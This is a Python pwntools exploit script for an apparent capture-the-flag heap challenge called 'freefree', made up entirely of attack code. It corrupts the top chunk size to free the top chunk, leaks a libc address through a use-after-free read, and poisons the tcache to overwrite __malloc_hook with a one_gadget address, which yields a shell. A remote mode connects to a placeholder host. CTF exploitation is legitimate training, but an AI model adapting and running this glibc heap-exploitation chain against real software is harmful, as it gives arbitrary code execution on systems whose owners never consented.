#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./freefree"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+390
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def alloc(val: str, size: int):
    cmd = "{}=malloc({})".format(val, size)
    p.sendlineafter('>', cmd)

def gets(val: str, buf):
    cmd = "gets({})".format(val)
    p.sendlineafter('>', cmd)
    p.sendline(buf)

def puts(val: str):
    cmd = "puts({})".format(val)
    p.sendlineafter('>', cmd)
    p.recvuntil('\x20')
    return p.recvline().rstrip(b'\n')

alloc('A', 0x10)
fake_top_size = 0xd51# before: 0x020d50
# overwrite top.size
gets('A', b'a' * 0x18 + p64(fake_top_size))
# top will be free
alloc('B', 0xd30)# get chunks from the area created by sbrk
gets('B', b'b' * 0x20)# for debug
alloc('C', 0xd20)# alloc freed top (Unsorted Bin)

# Use After Free
leak = u64(puts('C') + b'\0' * 2)
log.info("leak: " + hex(leak))
libc_base = leak - 0x1ecbe0
log.info('libc_base: ' + hex(libc_base))
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook: ' + hex(malloc_hook_addr))
one_gadget_offset = 0xe3afe
one_gadget_addr = libc_base + one_gadget_offset
log.info("OneGadget: " + hex(one_gadget_addr))

# prepare 2 chunks for tcache
top_fake_size = 0x2c1
# overwrite 2nd top.size
gets('B', b'b' * 0xd38 + p64(top_fake_size))
alloc('D', 0xd30)
gets('D', b'd' * 0xd38 + p64(top_fake_size))
alloc('E', 0x2a0)

# tcache poisoning (fd)
gets('D', b'd' * 0xd38 + p64(0x2a1) + p64(malloc_hook_addr))

alloc('F', 0x290)
alloc('G', 0x290)
# puts('G')
gets('G', p64(one_gadget_addr))

alloc('A', 0x10)

p.interactive()
